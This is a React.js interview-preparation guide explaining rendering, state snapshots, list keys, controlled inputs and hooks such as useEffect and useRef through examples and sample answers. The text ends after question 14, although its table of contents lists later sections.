# React.js: Interview Preparation

> **Updated:** 27 October 2026 (React 19.2 is current) · **Level:** basics → hooks → architecture & production
> **How to use:** read the *Short answer* first, then *How it works* and the *Example* walkthrough. *Common mistake → fix* shows what goes wrong in real code. *Interview answer* is what you can say out loud.

---

## Table of contents

1. [Mental model: how React updates the screen](#1-mental-model-how-react-updates-the-screen)
2. [Fundamentals](#2-fundamentals) (Q01–Q09)
3. [Hooks in depth](#3-hooks-in-depth) (Q10–Q19)
4. [React 18/19 features](#4-react-1819-features) (Q20–Q26)
5. [State management & data fetching](#5-state-management--data-fetching) (Q27–Q31)
6. [Performance](#6-performance) (Q32–Q35)
7. [Security, testing, accessibility](#7-security-testing-accessibility) (Q36–Q40)
8. [Scenario & debugging questions](#8-scenario--debugging-questions) (Q41–Q45)
9. [React with TypeScript](#9-react-with-typescript) (Q46)
10. [Cheat sheet](#10-cheat-sheet)

---

## 1. Mental model: how React updates the screen

**The one idea everything else follows from:** you never change the page directly. You keep some data in **state**, and you write a function (a component) that says "given this data, the screen should look like this". When the data changes, React calls your function again, compares the new result with the old one, and changes only the parts of the page that are different.

Think of it like a spreadsheet: you don't edit the total cell by hand. You change a number, and the total recalculates. In React, state is the numbers, your components are the formulas, and the page is the recalculated sheet.

```flow
pipeline: What happens after you call setCount(1)
stage: 1. Something changes
setCount(1) is called > React does NOT change the screen yet. It writes down "count should become 1" and schedules a re-render of this component.
stage: 2. Render (React calls your code)
React calls your component again > Your function runs from top to bottom. This time useState returns 1, so the JSX it returns shows 1.
React compares old vs new JSX > It finds the difference: the text inside the span changed from 0 to 1. Nothing else changed.
stage: 3. Commit (React changes the page)
React updates only that text node > The rest of the page is not touched, which is why React is fast.
Browser paints > The user now sees 1.
useEffect callbacks run > After the paint, React runs any effects whose dependencies changed (for example, saving to the server).
```

**Three rules that come straight from this model:**
1. **Your component must be "pure" while rendering.** Given the same props and state it must return the same JSX and must not do things like API calls or `document.title = …` during render. React may call it more than once (Strict Mode does this on purpose in development to catch mistakes).
2. **Side effects go in event handlers or effects.** If the user caused it (a click) → event handler. If it has to stay in sync with something outside React (a WebSocket, a timer, the document title) → `useEffect`.
3. **A component re-renders when** its own state changes, its parent re-renders, or a context value it reads changes.

---

## 2. Fundamentals

### Q01. What is React and what is a component?

**Short answer:** React is a JavaScript library for building user interfaces. A **component** is just a function that takes inputs (called **props**) and returns **JSX** — HTML-like markup that describes what should appear on screen. You build a page by putting small components inside bigger ones.

**How it works:** Instead of writing step-by-step instructions to change the page ("find this span, set its text, change its colour" — called *imperative* code), you describe the result you want for the current data ("when the status is failed, show a red label" — called *declarative* code). React works out which page changes are needed.

**Example:**
```jsx
function JobStatus({ status }) {
  const color = status === "failed" ? "red" : "green";
  return <span style={{ color }}>{status}</span>;
}

function JobRow({ job }) {
  return (
    <li>
      {job.name} — <JobStatus status={job.status} />
    </li>
  );
}
```

**What happens, step by step:**
1. `JobRow` is rendered with `job = { name: "Invoice OCR", status: "failed" }`.
2. It returns JSX that includes `<JobStatus status="failed" />`, so React calls `JobStatus({ status: "failed" })`.
3. Inside, `color` is computed as `"red"` and the function returns `<span style={{ color: "red" }}>failed</span>`.
4. React creates the real `<li>` and `<span>` elements in the page.
5. Later the job's status becomes `"done"`. React calls both functions again, sees that only the span's text and colour differ, and updates just those two things.

**What is JSX really?** It is not HTML. The build tool turns `<JobStatus status="failed" />` into a normal function call, roughly `jsx(JobStatus, { status: "failed" })`, which returns a small JavaScript object describing the element. React uses these objects to decide what to put in the real page.

**Common mistake → fix:** naming a component in lowercase.
```jsx
function jobStatus() { … }      // ❌ <jobStatus /> is treated as an unknown HTML tag
function JobStatus() { … }      // ✅ components must start with a capital letter
```

**Interview answer:** "React is a UI library where you describe the screen as a function of your data. A component is a function that takes props and returns JSX. When data changes, React re-runs the components, compares the new output with the previous one, and applies only the differences to the DOM. That makes UIs predictable: the same data always produces the same screen."

**Follow-ups:**
- *Is React a framework?* It's a library for the view layer. Frameworks such as Next.js or React Router add routing, data loading and server rendering on top.
- *What is the virtual DOM?* The tree of plain objects your components return. React diffs the new tree against the old one to find the minimal real-DOM changes.

---

### Q02. Props vs state vs derived values

**Short answer:**
- **Props** are inputs a parent passes to a child. The child can read them but never change them.
- **State** is data a component *remembers* between renders (for example, which tab is open). Changing it makes the component re-render.
- **Derived values** are anything you can calculate from props or state (a filtered list, a count). Calculate them during render — don't store them in state.

**How it works:** Data flows **down** through props; requests to change data flow **up** through callback functions. The component that owns a piece of state is the only one that can change it. If you also store a value that can be calculated from other state, you now have two copies that can disagree.

**Example:**
```jsx
function DocList({ documents }) {                       // documents = prop (from the parent)
  const [filter, setFilter] = useState("all");          // filter = state (this component owns it)

  // derived values: recalculated on every render from props + state
  const visible = documents.filter(d => filter === "all" || d.status === filter);
  const doneCount = documents.filter(d => d.status === "done").length;

  return (
    <>
      <select value={filter} onChange={e => setFilter(e.target.value)}>
        <option value="all">All</option>
        <option value="done">Done</option>
      </select>
      <p>{doneCount} done</p>
      <ul>{visible.map(d => <li key={d.id}>{d.title}</li>)}</ul>
    </>
  );
}
```

**What happens, step by step:**
1. First render: `filter` is `"all"`, so `visible` is all documents and `doneCount` is calculated from the list.
2. The user picks "Done". `setFilter("done")` schedules a re-render.
3. Second render: `filter` is now `"done"`. `visible` and `doneCount` are recalculated from the new values, so they're always correct.
4. If the parent passes a new `documents` array (say a document finished), the same calculations run again and the count updates automatically.

**Common mistake → fix:** copying a derived value into state and syncing it with an effect.
```jsx
// ❌ two sources of truth: for one render doneCount is stale, and it's easy to forget to update
const [doneCount, setDoneCount] = useState(0);
useEffect(() => {
  setDoneCount(documents.filter(d => d.status === "done").length);
}, [documents]);

// ✅ just calculate it
const doneCount = documents.filter(d => d.status === "done").length;
```
If the calculation is genuinely expensive (thousands of items, complex maths), wrap it in `useMemo` — still not state.

**Interview answer:** "Props are read-only inputs from the parent, state is data a component owns and changes over time, and anything you can compute from those two should be computed during render, not stored. Keeping one source of truth avoids bugs where two copies of the same data disagree."

**Follow-ups:**
- *Can a child change its props?* No. It calls a function the parent passed down (like `onChange`), and the parent updates its own state.
- *When should data be state at all?* Only if it changes over time, can't be computed from other data, and isn't already held somewhere else (URL, server cache).

---

### Q03. How does state update? Why does `console.log` show the old value after `setState`?

**Short answer:** Calling `setCount(…)` does **not** change `count` right away. It asks React to re-render the component, and in **that next render** `useState` returns the new value. The code that is still running (your click handler) keeps seeing the value from the render it belongs to — React calls this a **snapshot**. That's why `console.log(count)` right after `setCount` prints the old value.

**How it works:**
- Every render is like a photo. In that photo, `count` is a fixed number (a plain `const`). Your event handler was created during that render, so it "sees" that photo's value.
- `setCount(x)` puts an update in a queue and schedules a new render. It can't change a `const` that already exists.
- React waits until your handler finishes, then processes all queued updates together (**batching**) and renders once.
- In the new render, `useState` returns the updated value, and the new JSX (and new handlers) see it.

**Example:**
```jsx
function Counter() {
  const [count, setCount] = useState(0);

  function handleClick() {
    setCount(count + 1);
    console.log(count);          // prints 0, not 1
  }

  console.log("rendering with", count);   // prints "rendering with 0", then "rendering with 1"
  return <button onClick={handleClick}>Clicked {count} times</button>;
}
```

**What happens, step by step (first click):**
1. First render: `useState(0)` returns `0`, so `count` is `0`. The button shows "Clicked 0 times" and `handleClick` is created with `count = 0` inside it.
2. The user clicks. `handleClick` runs. `setCount(count + 1)` is `setCount(0 + 1)` → React notes "next value is 1" and schedules a render.
3. `console.log(count)` runs on the very next line. `count` is still the `0` from this render, so it prints **0**. Nothing is broken; the new value simply doesn't exist yet in this run.
4. The handler finishes. React re-renders `Counter`. This time `useState` returns **1**, so the body logs "rendering with 1" and the button shows "Clicked 1 times".

```flow
trace: One click, frame by frame
render 1: count = **0**, button shows "Clicked 0 times" > React calls Counter. useState returns 0, and the click handler is created inside this render, so it remembers count = 0.
click: setCount(0 + 1) queued > Calling the setter only puts "set to 1" in a queue. count in the running handler is still 0.
same handler: console.log(count) prints **0** > The handler is still part of render 1, so it sees render 1's value. The new value only exists in the next render.
handler ends, React re-renders > React processes the queue after your code finishes.
render 2: count = **1**, button shows "Clicked 1 times" > useState now returns 1. The next click's handler will see 1.
```

**How do I use the new value then?** Pick the option that fits:
```jsx
// 1. You need it in the same handler → calculate it yourself and use the variable
function handleClick() {
  const next = count + 1;
  setCount(next);
  saveToServer(next);              // ✅ uses 1
}

// 2. You need to react to it after the screen updates → an effect
useEffect(() => {
  document.title = `Clicked ${count} times`;   // ✅ runs after each render where count changed
}, [count]);

// 3. You just want to see it → log during render (as above) or use React DevTools
```

**Multiple updates in one handler — the updater function:**
```jsx
function addThree() {
  setCount(count + 1);   // count is 0 → "set to 1"
  setCount(count + 1);   // count is STILL 0 → "set to 1"
  setCount(count + 1);   // "set to 1"
}                        // after re-render: 1, not 3

function addThreeCorrectly() {
  setCount(c => c + 1);  // queue: "take the latest value, add 1"
  setCount(c => c + 1);
  setCount(c => c + 1);
}                        // React applies them in order: 0→1, 1→2, 2→3 → after re-render: 3
```
When you pass a function (an *updater*), React doesn't use your stale `count`; it passes in the result of the previous queued update. Use the updater form whenever the next value depends on the previous one.

**Objects and arrays — always create a new one:**
```jsx
setUser(u => ({ ...u, name: "Ana" }));      // ✅ new object → React sees a change
setItems(items => [...items, newItem]);     // ✅ new array

items.push(newItem);                        // ❌ changes the existing array in place
setItems(items);                            //    same reference → React may skip the re-render
```
React decides "did state change?" by comparing references (`Object.is`). Mutating the old object keeps the same reference, so React can't tell anything changed.

**Common mistake → fix:** using the state value right after setting it, e.g. `setQuery(text); fetchResults(query)` sends the **old** query. Fix: `fetchResults(text)` (use the value you just computed), or fetch in an effect / data library keyed on `query`.

**Interview answer:** "A state setter doesn't mutate the variable — it queues an update and schedules a re-render. The current render's code keeps seeing a snapshot of the old value, so a `console.log` right after `setState` prints the old value. React batches all updates from the same event into one render, and in that render `useState` returns the new value. If the next value depends on the previous one, I use the updater form `setCount(c => c + 1)`, and I always create new objects or arrays instead of mutating."

**Follow-ups:**
- *Is setState asynchronous like a Promise?* Not exactly — you can't `await` it. It's "deferred": the update is applied in the next render, after your handler finishes.
- *What is automatic batching?* Since React 18, all updates in the same tick — in event handlers, timeouts, promises — are combined into a single render.
- *Can I force a synchronous update?* `flushSync(() => setCount(1))` from `react-dom` forces the render immediately. It's rarely needed (e.g. scrolling to a just-added item) and hurts performance.

---

### Q04. Why do list keys matter?

**Short answer:** When you render a list, React needs to know **which item is which** between renders so it can keep each item's state (typed text, checkbox, open/closed) attached to the right item. The `key` prop is that identity. Use a stable, unique ID from your data — not the array index, which changes when items are added, removed or reordered.

**How it works:** On re-render, React matches old and new list items **by key**. Same key → "same item, just update it" (state and DOM are kept). New key → create it. Missing key → remove it. If keys are array indexes, then after deleting the first row every other row's index shifts by one, so React thinks row 0 still exists — and gives the old row 0's state to whatever item is now first.

**Example:**
```jsx
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map((todo, index) => (
        <li key={index}>             {/* ❌ index as key */}
          {todo.text} <input placeholder="note" />
        </li>
      ))}
    </ul>
  );
}
```

```flow
trace: Deleting the first row when keys are indexes
rows: key 0 = "Buy milk" (note typed: **urgent**), key 1 = "Call bank", key 2 = "Pay rent" > The user typed "urgent" into the note box of the first row. That text lives in the input element that belongs to key 0.
delete "Buy milk"  →  new list: key 0 = "Call bank", key 1 = "Pay rent" > Removing the first item shifts every index down by one.
React matches by key: key 0 still exists, key 2 is gone > React thinks the first row survived and the last row was deleted.
result: "Call bank" now shows note **urgent** > The input (and its typed text) stayed with key 0, so it now sits next to the wrong item.
fix: key = todo.id → React removes exactly the "Buy milk" row > With stable ids, the input moves with the item it belongs to.
```

**What happens, step by step:**
1. Three rows render with keys 0, 1, 2. The user types "urgent" into row 0's input. That text lives in the DOM input element owned by key 0.
2. "Buy milk" is deleted. The new array has two items, rendered with keys 0 and 1.
3. React compares: keys 0 and 1 exist in both renders → "update them"; key 2 disappeared → "remove it".
4. So React keeps the first `<li>` and its input (with "urgent") and just changes its text to "Call bank". The last `<li>` is removed.
5. Result: "urgent" now appears next to "Call bank". That's the bug.

**Fix:**
```jsx
{todos.map(todo => (
  <li key={todo.id}>{todo.text} <input placeholder="note" /></li>
))}
```
Now deleting "Buy milk" removes the `<li>` with key `"t1"` and the other rows keep their own inputs.

**When is the index OK?** Only for a static list that never reorders, filters or deletes, and whose items have no state.

**Common mistake → fix:** generating keys during render, e.g. `key={Math.random()}` or `key={crypto.randomUUID()}`. Every render gets new keys, so React destroys and recreates every row each time (losing focus and state, and slow). Use an ID that comes with the data, or create it once when the item is created.

**Interview answer:** "Keys tell React which list item is which between renders, so it can keep the right state and DOM element with the right item. I use a stable unique ID from the data. Index keys break when the list is reordered or items are removed, because the index-to-item mapping shifts and state ends up attached to the wrong row."

**Follow-ups:**
- *Do keys need to be globally unique?* No, only unique among siblings in the same list.
- *Can keys be used outside lists?* Yes — changing a component's `key` forces React to treat it as a new component and reset its state (see Q32).

---

### Q05. Render vs commit

**Short answer:** An update happens in two phases. **Render**: React calls your components to work out what the UI should look like now — this only produces a description and changes nothing on screen. **Commit**: React applies the differences to the real page, then runs effects. Because the render phase may be paused, repeated or thrown away, it must not have side effects.

**How it works:**
- **Render phase:** React calls component functions, gets new JSX, and compares it with the previous result. In concurrent features (`useTransition`, Suspense) React may start a render, pause it for something more urgent, or discard it entirely.
- **Commit phase:** synchronous and can't be interrupted. React updates the DOM, attaches refs, runs `useLayoutEffect`, lets the browser paint, then runs `useEffect`.

**Example — why render must be pure:**
```jsx
let renderCount = 0;
function Profile({ user }) {
  renderCount++;                                // ❌ side effect during render
  analytics.track("profile_viewed");            // ❌ may fire 2× (Strict Mode) or for discarded renders
  return <h1>{user.name}</h1>;
}

function ProfileFixed({ user }) {
  useEffect(() => {
    analytics.track("profile_viewed", { id: user.id });   // ✅ runs once per committed change of user.id
  }, [user.id]);
  return <h1>{user.name}</h1>;
}
```

**What happens, step by step:**
1. In development with Strict Mode, React renders `Profile` twice on purpose to expose impure code, so the first version tracks the event twice.
2. With concurrent rendering, React might render `Profile` for an update and then discard that render because a newer update arrived — the event was tracked for a screen the user never saw.
3. The fixed version puts the tracking in an effect, which only runs after React actually commits the UI to the screen.

**Interview answer:** "Render is React calling my components to compute the new UI — pure, no side effects, and possibly repeated or discarded. Commit is React applying the minimal DOM changes and then running effects. So anything that touches the outside world goes in event handlers or effects, never in the render body."

**Follow-ups:**
- *Does a re-render always change the DOM?* No. If the new JSX equals the old, the commit changes nothing.
- *Where do refs get their value?* During commit, so don't read `ref.current` during render.

---

### Q06. Controlled vs uncontrolled inputs

**Short answer:** In a **controlled** input, React state holds the value: you pass `value={text}` and update the state in `onChange`, so React is always the source of truth. In an **uncontrolled** input, the browser holds the value and you read it when you need it (with a ref or `FormData` on submit). Use controlled when you need to validate, format or react to every keystroke; uncontrolled is simpler for plain forms.

**Example:**
```jsx
// Controlled: React owns the value
function SearchBox() {
  const [query, setQuery] = useState("");
  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value.toUpperCase())} />
      {query.length > 50 && <p>Too long</p>}
    </>
  );
}

// Uncontrolled: the browser owns the value; read it on submit
function SignupForm() {
  function handleSubmit(e) {
    e.preventDefault();
    const data = new FormData(e.currentTarget);
    api.signup({ email: data.get("email") });
  }
  return (
    <form onSubmit={handleSubmit}>
      <input name="email" defaultValue="" />
      <button>Sign up</button>
    </form>
  );
}
```

**What happens, step by step (controlled, typing "a"):**
1. The browser fires a change event with `e.target.value === "a"`.
2. `setQuery("A")` runs (we upper-case it) and schedules a re-render.
3. React re-renders with `query = "A"` and sets the input's value to `"A"`. The user sees an upper-case letter even though they typed lower-case — that's the power of controlling the value.

**Common mistake → fix:** setting `value` without `onChange`.
```jsx
<input value={query} />   // ❌ read-only: React keeps forcing the old value, typing does nothing (and React warns)
<input value={query} onChange={e => setQuery(e.target.value)} />   // ✅
<input defaultValue="hello" />                                      // ✅ uncontrolled with an initial value
```
Also: don't switch between the two (`value={undefined}` → `value="x"`). Initialise with `""`, not `undefined`.

**Interview answer:** "Controlled inputs keep the value in React state with `value` and `onChange`, which makes validation and formatting easy. Uncontrolled inputs leave the value in the DOM and I read it via a ref or FormData on submit, which is simpler and renders less. Form libraries like React Hook Form mostly use uncontrolled inputs for performance."

**Follow-ups:**
- *Why might controlled inputs be slow?* Every keystroke re-renders the component. For a large form, keep state local to each field or use a form library.
- *File inputs?* Always uncontrolled — you can't set a file input's value from code.

---

### Q07. Lifting state up and prop drilling

**Short answer:** When two sibling components need the same data, move that state up to their **closest common parent** and pass it down as props ("lifting state up"). If you then have to pass the same prop through several layers of components that don't use it, that's **prop drilling** — fix it with component composition (pass components as `children`) or with context.

**Example:**
```jsx
function SearchPage() {
  const [query, setQuery] = useState("");             // lifted: both children need it
  return (
    <>
      <SearchBox query={query} onChange={setQuery} />
      <Results query={query} />
    </>
  );
}

function SearchBox({ query, onChange }) {
  return <input value={query} onChange={e => onChange(e.target.value)} />;
}

function Results({ query }) {
  const { data } = useSearch(query);
  return <ul>{data?.map(r => <li key={r.id}>{r.title}</li>)}</ul>;
}
```

**What happens, step by step:**
1. The user types "vpn" in `SearchBox`, which calls `onChange("vpn")` → that's `setQuery` in the parent.
2. `SearchPage` re-renders with `query = "vpn"`.
3. Both children receive the new value: `SearchBox` shows it, `Results` searches with it. The siblings never talk to each other directly — the parent connects them.

**Prop drilling and the fix:**
```jsx
// ❌ `user` passes through Layout and Sidebar, which don't use it, just to reach Avatar
<Layout user={user}><Sidebar user={user}><Avatar user={user} /></Sidebar></Layout>

// ✅ composition: build Avatar where `user` is available and pass it down as children
<Layout>
  <Sidebar>
    <Avatar user={user} />
  </Sidebar>
</Layout>
```
Use context only for values that many distant components need and that change rarely (theme, signed-in user, locale) — see Q16.

**Interview answer:** "If siblings need the same state, I move it to their closest common parent and pass it down, so there's one source of truth. When that causes props to travel through many layers that don't use them, I first try composition — passing elements as children — and use context for genuinely app-wide, low-frequency values."

**Follow-ups:**
- *Why not put everything in global state?* Global state makes data flow hard to follow and can cause many components to re-render. Keep state as close as possible to where it's used.

---

### Q08. Conditional rendering and fragments

**Short answer:** You show or hide parts of the UI with normal JavaScript: `if`, the ternary `a ? b : c`, or `condition && <X />`. A **fragment** (`<>…</>`) groups several elements without adding an extra `<div>` to the page. Watch out for `&&` with numbers: `0 && <X />` renders the number `0`.

**Example:**
```jsx
function JobPanel({ job, isLoading, count }) {
  if (isLoading) return <Spinner />;                    // early return

  return (
    <>                                                  {/* fragment: no extra div */}
      <h2>{job.name}</h2>
      {job.error ? <ErrorBox msg={job.error} /> : <Result data={job.result} />}
      {count > 0 && <Badge n={count} />}
    </>
  );
}
```

**What happens with the `0` gotcha:**
```jsx
{count && <Badge n={count} />}
```
1. If `count` is `3`, `3 && <Badge/>` evaluates to `<Badge/>` → the badge renders. ✅
2. If `count` is `0`, `0 && <Badge/>` evaluates to `0` (the `&&` stops at the first falsy value and returns it).
3. React renders numbers as text, so a stray **"0"** appears on the page. `false`, `null` and `undefined` render nothing, but `0` and `NaN` do.

**Fix:** make the condition a real boolean: `{count > 0 && <Badge n={count} />}` or `{count ? <Badge n={count} /> : null}`.

**Interview answer:** "I use early returns for whole-component states like loading, ternaries for either/or, and `&&` for show-or-nothing — always with a boolean condition, because `0 && …` renders a zero. Fragments let me return several siblings without wrapping them in an extra DOM element."

**Follow-ups:**
- *When do you need `<Fragment key=…>`?* When you map a list to multiple siblings per item — the short `<>` syntax can't take a key.

---

### Q09. Class components vs function components

**Short answer:** Function components with Hooks are the modern standard. Class components (with `this.state` and lifecycle methods like `componentDidMount`) still work, and you'll see them in older code. The one thing you still need a class for is an **error boundary** (Q23).

**How the old lifecycle maps to hooks:**

| Class component | Function component |
|---|---|
| `this.state`, `this.setState` | `useState` / `useReducer` |
| `componentDidMount` + `componentWillUnmount` | `useEffect(() => { …; return cleanup; }, [])` |
| `componentDidUpdate(prevProps)` | `useEffect(…, [dependency])` |
| `shouldComponentUpdate` / `PureComponent` | `React.memo` |
| `getDerivedStateFromError` / `componentDidCatch` | no hook — still needs a class |

**Example:**
```jsx
class Clock extends React.Component {
  state = { now: new Date() };
  componentDidMount()    { this.id = setInterval(() => this.setState({ now: new Date() }), 1000); }
  componentWillUnmount() { clearInterval(this.id); }
  render()               { return <p>{this.state.now.toLocaleTimeString()}</p>; }
}

function ClockFn() {
  const [now, setNow] = useState(new Date());
  useEffect(() => {
    const id = setInterval(() => setNow(new Date()), 1000);   // start when it appears
    return () => clearInterval(id);                           // stop when it disappears
  }, []);
  return <p>{now.toLocaleTimeString()}</p>;
}
```
The function version keeps "start the timer" and "stop the timer" together in one place, instead of spreading them across two lifecycle methods.

**Interview answer:** "I write function components with hooks — less code, and related logic stays together instead of being split across lifecycle methods. I can read and maintain class components, and I still use a class for error boundaries because there's no hook equivalent."

**Follow-ups:**
- *Why did React move to hooks?* Reusing stateful logic between classes needed awkward patterns (higher-order components, render props). Custom hooks make that reuse simple.

---

## 3. Hooks in depth

### Q10. Rules of Hooks — and why they exist

**Short answer:** Two rules: (1) call hooks only at the **top level** of a component or custom hook — never inside `if`, loops, or nested functions; (2) call them only from **React function components or custom hooks**. They exist because React doesn't know hooks by name; it identifies each hook by the **order** in which it is called. If the order changes between renders, state gets mixed up.

**How it works:** For each component, React keeps a list of hook "slots". On every render, the first `useState` call reads slot 0, the second reads slot 1, and so on. That only works if the same hooks are called in the same order every time.

**Example — what goes wrong:**
```jsx
function Profile({ isAdmin }) {
  if (isAdmin) {
    const [notes, setNotes] = useState("");   // ❌ hook inside a condition
  }
  const [name, setName] = useState("Asha");
  …
}
```

```flow
trace: How React matches hooks by call order
render 1 (isAdmin = true): useState("") → slot 0 = notes, useState("Asha") → slot 1 = name > React stores state in slots by position. Two hooks were called, so two slots exist.
render 2 (isAdmin = false): the if-block is skipped > Now only one useState call happens.
useState("Asha") reads **slot 0** → gets notes' value "" > React has no names, only positions. The name variable receives the notes value.
result: name is "" and React warns about a changed hook order > State is silently mixed up. That's why hooks must run in the same order every render.
```

**Fix:** always call the hook, and put the condition inside:
```jsx
function Profile({ isAdmin }) {
  const [notes, setNotes] = useState("");      // ✅ always called
  const [name, setName] = useState("Asha");
  return <>{isAdmin && <textarea value={notes} onChange={e => setNotes(e.target.value)} />}</>;
}
```
Early `return` before a hook has the same problem: put all hooks above any early return.

**Interview answer:** "Hooks must be called unconditionally at the top level, in the same order on every render, because React identifies each hook's state by its call position, not by name. Conditional hooks shift the positions and mix up state. The ESLint plugin `eslint-plugin-react-hooks` enforces this."

**Follow-ups:**
- *Is `use()` an exception?* Yes — the React 19 `use` API can be called inside conditions and loops, because it reads a promise or context rather than storing state in a slot.

---

### Q11. `useState` vs `useReducer`

**Short answer:** Both store state. `useState` is best for simple, independent values (a toggle, a text field). `useReducer` is better when several pieces of state change together or the next state depends on *which action happened* (started → uploading → failed → retried): you describe each change as a named **action** and handle all of them in one **reducer** function.

**How it works:** A reducer is a pure function `(currentState, action) => newState`. Components call `dispatch({ type: "upload_failed", error })` instead of several setters. All the transition rules live in one place, are easy to unit-test, and impossible combinations (like "loading" and "error" at the same time) are easier to prevent.

**Example:**
```jsx
const initial = { status: "idle", progress: 0, error: null };

function uploadReducer(state, action) {
  switch (action.type) {
    case "started":  return { status: "uploading", progress: 0, error: null };
    case "progress": return { ...state, progress: action.percent };
    case "failed":   return { ...state, status: "failed", error: action.error };
    case "done":     return { status: "done", progress: 100, error: null };
    default:         throw new Error(`Unknown action ${action.type}`);
  }
}

function Uploader() {
  const [state, dispatch] = useReducer(uploadReducer, initial);

  async function upload(file) {
    dispatch({ type: "started" });
    try {
      await api.upload(file, pct => dispatch({ type: "progress", percent: pct }));
      dispatch({ type: "done" });
    } catch (e) {
      dispatch({ type: "failed", error: e.message });
    }
  }
  …
}
```

**What happens, step by step:**
1. `dispatch({ type: "started" })` → React calls `uploadReducer(initial, action)` during the next render, which returns `{ status: "uploading", progress: 0, error: null }`.
2. Progress events dispatch `"progress"` → only `progress` changes; everything else is copied with `...state`.
3. On failure, `"failed"` sets `status` and `error` together in one update, so the UI never shows "uploading" with an error message.

**With `useState` you'd need three setters called in the right combination every time** — easy to forget one (e.g. clearing `error` when retrying).

**Interview answer:** "I use `useState` for simple independent values and `useReducer` when state has several related fields or clear named transitions. The reducer centralises the logic in a pure, testable function, and components just dispatch what happened instead of knowing how to update every field."

**Follow-ups:**
- *Is useReducer faster?* Not meaningfully. It's about organising logic. `dispatch` has a stable identity, which is handy when passing it to children.
- *useReducer vs Redux?* Same idea, but useReducer is local to one component (plus context if you share it). Redux adds a global store, middleware and devtools.

---

### Q12. What does `useEffect` actually do?

**Short answer:** `useEffect` lets a component **stay in sync with something outside React** — a WebSocket, a timer, a browser API, a third-party widget. React runs your effect **after** the screen has updated, re-runs it whenever a value in its **dependency array** changes, and calls the **cleanup** function you return before re-running it and when the component is removed.

**How it works:** Think of an effect as "start syncing" and its cleanup as "stop syncing". With dependencies `[sessionId]`, React compares the value after each render: unchanged → do nothing; changed → run the old cleanup, then the new effect.

**Example:**
```jsx
function ChatStream({ sessionId }) {
  const [messages, setMessages] = useState([]);

  useEffect(() => {
    const source = new EventSource(`/api/sessions/${sessionId}/stream`);   // start
    source.onmessage = e => setMessages(m => [...m, JSON.parse(e.data)]);
    return () => source.close();                                           // stop
  }, [sessionId]);

  return <MessageList items={messages} />;
}
```

```flow
trace: The effect's life as sessionId changes from A to B
mount with sessionId = A: render → paint → **effect(A)** opens stream A > Effects run after the browser has painted, so they never block the first screen.
re-render, sessionId still A: effect skipped > React compares dependencies. Same value means nothing to re-sync.
sessionId changes to B: render → paint → **cleanup(A)** closes stream A > The old cleanup always runs first, so you never have two streams open.
then **effect(B)** opens stream B > Now the component is synced with the new session.
component removed: **cleanup(B)** closes stream B > No leaked connections after the user leaves the page.
```

**Common mistakes → fixes:**
1. **No cleanup** → every session switch opens another stream; old messages keep arriving in the new chat. Always return a cleanup that undoes what the effect started.
2. **Missing dependency** → the effect keeps using an old `sessionId`. List every reactive value the effect uses (the lint rule tells you).
3. **Object/function in dependencies created during render** → `useEffect(…, [options])` where `options = { id }` is a new object every render → the effect re-runs every render. Depend on primitives (`options.id`) or memoise.

**Why does my effect run twice in development?** React 18+ Strict Mode deliberately mounts, unmounts and re-mounts each component once in development to check that your cleanup really undoes your effect. It does not happen in production. If running twice breaks something, the cleanup is missing.

**Interview answer:** "useEffect synchronises a component with an external system. It runs after paint, re-runs when its dependencies change, and runs the previous cleanup first, so subscriptions are always started and stopped in pairs. I list every reactive value it uses as a dependency, and I avoid effects for things that can be calculated during render or handled in an event handler."

**Follow-ups:**
- *Empty array vs no array?* `[]` → run once after mount (cleanup on unmount). No array → run after every render.
- *Can the effect function be async?* Not directly (it must return a cleanup function, not a promise). Define an async function inside and call it, and use a flag or `AbortController` in the cleanup to ignore stale results.

---

### Q13. When should you NOT use `useEffect`?

**Short answer:** Don't use an effect when nothing outside React is involved. Specifically: (1) values you can **calculate during render**, (2) logic caused by a **user action** — put it in the event handler, (3) **resetting state** when a prop changes — use a `key`, and (4) usually **data fetching** — prefer a data library or your framework's loader. Unnecessary effects cause extra renders and "state out of sync" bugs.

**Example — four effects you can delete:**
```jsx
// 1. Derived value
// ❌
const [fullName, setFullName] = useState("");
useEffect(() => setFullName(`${first} ${last}`), [first, last]);
// ✅
const fullName = `${first} ${last}`;

// 2. Event logic
// ❌ effect watches a flag that the click handler sets
useEffect(() => { if (submitted) api.post(form); }, [submitted]);
// ✅ do it where it happens
function handleSubmit() { api.post(form); }

// 3. Reset state when a prop changes
// ❌
useEffect(() => setDraft(""), [conversationId]);
// ✅ a new key = a brand-new component with fresh state
<Composer key={conversationId} />

// 4. Fetching
// ❌ hand-written fetch-in-effect: no caching, races, duplicate requests
// ✅ const { data } = useQuery({ queryKey: ["doc", id], queryFn: () => getDoc(id) });
```

**Why the ❌ versions are worse:** each one renders once with stale values, then the effect runs and triggers a second render with the right values. Users can see the stale frame, and the extra logic is easy to get wrong.

**Interview answer:** "Effects are for synchronising with external systems. If I can compute something from props or state, I compute it during render. If it's a reaction to a user action, it goes in the event handler. To reset a component when an ID changes, I give it a `key`. For fetching I use TanStack Query or the router's loader instead of hand-written effects."

**Follow-ups:**
- *Is there a way to check?* Ask: "would this code need to run if the component appeared on screen without any user action?" If not, it's event logic.

---

### Q14. `useRef` — what is it for?

**Short answer:** `useRef` gives you a small box, `{ current: … }`, that **keeps its value between renders but doesn't cause a re-render when you change it**. Two main uses: (1) holding a reference to a DOM element (to focus, scroll or measure it), and (2) remembering a value that isn't shown on screen, like a timer ID or the previous value of a prop.

**Example:**
```jsx
function SearchBox() {
  const inputRef = useRef(null);         // 1. DOM element
  const timerRef = useRef(null);         // 2. value that isn't displayed
  const [query, setQuery] = useState("");

  function handleChange(e) {
    setQuery(e.target.value);
    clearTimeout(timerRef.current);                              // cancel the previous timer
    timerRef.current = setTimeout(() => search(e.target.value), 300);   // debounce
  }

  return (
    <>
      <input ref={inputRef} value={query} onChange={handleChange} />
      <button onClick={() => inputRef.current.focus()}>Focus</button>
    </>
  );
}
```

**What happens, step by step:**
1. During commit, React sets `inputRef.current` to the real `<input>` element.
2. Each keystroke stores a new timer ID in `timerRef.current`. That doesn't re-render anything — we don't need to show the ID.
3. The next keystroke clears the previous timer via the saved ID, so `search` only runs 300 ms after the user stops typing.
4. Clicking "Focus" calls `.focus()` on the real DOM element.

**Ref vs state:**

| | `useRef` | `useState` |
|---|---|---|
| Survives re-renders | yes | yes |
| Changing it re-renders | **no** | **yes** |
| Use for | DOM nodes, timer IDs, previous values, mutable bookkeeping | anything shown on screen |

